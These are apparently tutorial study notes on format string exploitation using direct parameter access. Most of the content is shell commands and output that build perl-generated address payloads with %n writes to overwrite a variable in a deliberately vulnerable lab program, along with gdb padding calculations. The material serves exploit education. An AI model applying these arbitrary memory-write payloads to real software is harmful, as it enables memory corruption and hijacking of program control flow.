Direct parameter access is a way to simplify format string exploits
In the previous exploits, each of the format parameter arguments had to be stepped through sequentially
This necessitated using several %x fromat parameters to step through parameter arguments until the beginning of the format string was reached
In addition, the sequential nature required 3 4-byte words of junk to properly write a full address to an arbitrary memory location

As the name would imply, direct parameter access allows parameters to be accessed directly by using the dollar sign quialifier
For example, %n$d would access the nth parameter and display it as a decimal number
__________________________________________________________________________________
printf("7th: %7$d, 4th: %4$05d\n", 10, 20, 30, 40, 50, 60, 70, 80);
__________________________________________________________________________________

__________________________________________________________________________________
7th: 70, 4th: 00040
__________________________________________________________________________________

First, the 70 is outputted as a decimal number when the format parameter of %7$d is encountered, beacuse the seventh parameter is 70
The second format parameter accesses the fourth parameter and uses a field width option of 05
All of the other parameter arguments are untouched
This method of direct access eliminates the need to step through memory until the beginning of the format string is located, since the memory can be accessed directly
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./fmt_vuln AAAA%x%x%x%x
The right way to print user-controlled input:
AAAA%x%x%x%x
The wrong way to print user-controlled input:
AAAAbffff3d0b7fe75fc041414141
[*] test_val @ 0x08049794 = -72 0xffffffb8

reader@hacking:~/booksrc $ ./fmt_vuln AAAA%4\$x
The right way to print user-controlled input:
AAAA%4$x
The wrong way to print user-controlled input:
AAAA41414141
[*] test_val @ 0x08049794 = -72 0xffffffb8
__________________________________________________________________________________

In this example, the beginning of the format string is located at the fourth parameter argument
Instead of stepping through the first 3 parameter arguments using %x format parameters, this memory can be accessed directly
Since this is being done on the command line and the dollar sign is a special character, it must be escaped with a backslash
This just tells the command line to avoid trying to interpret the dollar sign as a special character

Direct parameter access also simplifies the writing of memory addresses
Since memory can be accessed directly, thers' no need for 4-byte spacers of junk data to increment the byte output count
Each of the %x format parameters that usually performs this function can just directly access a piece of memory found before the format string
For practice, let's use direct parameter access to write a more realistic-looking address of 0xbffffd72 into the variable test_vals
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08" . "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%4\$n
The right way to print user-controlled input:
????????%4$n
The wrong way to print user-controlled input:
????????
[*] test_val @ 0x08049794 = 16 0x00000010

reader@hacking:~/booksrc $ gdb -q
(gdb) p 0x72 - 16
$1 = 98
(gdb) p 0xfd - 0x72
$2 = 139
(gdb) p 0xff - 0xfd
$3 = 2
(gdb) p 0x1ff - 0xfd
$4 = 258
(gdb) p 0xbf - 0xff
$5 = -64
(gdb) p 0x1bf - 0xff
$6 = 192
(gdb) quit

reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08" . "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n
The right way to print user-controlled input:
????????%98x%4$n%139x%5$n
The wrong way to print user-controlled input:
????????
                                    bffff3c0
                        b7fe75fc
[*] test_val @ 0x08049794 = 64882 0x0000fd72

reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08" . "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n%258x%6\$n%192x%7\$n
The right way to print user-controlled input:
????????%98x%4$n%139x%5$n%258x%6$n%192x%7$n
The wrong way to print user-controlled input:
????????
                                                    bffff3b0
                             b7fe75fc
0
8049794
[*] test_val @ 0x08049794 = -1073742478 0xbffffd72
__________________________________________________________________________________

In the previous chapter, we used JUNK data so that while reading the address, it would be read for the padding of %x
Now, we can directly access the memory address in the stack(%3$x)
We don't need junk as we don't care if the printf reads the target memory address for %x beacuse direct access allows us to go back and forth among the parameters
        Meaning that if the printf has printed upto bottom of stack + 6, we can still write to bottom of stack + 4 or vice versa


Since the stack doesn't need to be printed to reach our addresses, the number of bytes written at the first parameter is 16
Direct parameter access is only used for the %n parameters, since it really doesn't matter what values are used for the %x spacers
This method simplifies the process of writing an address and shrinks the mandatory size of the format string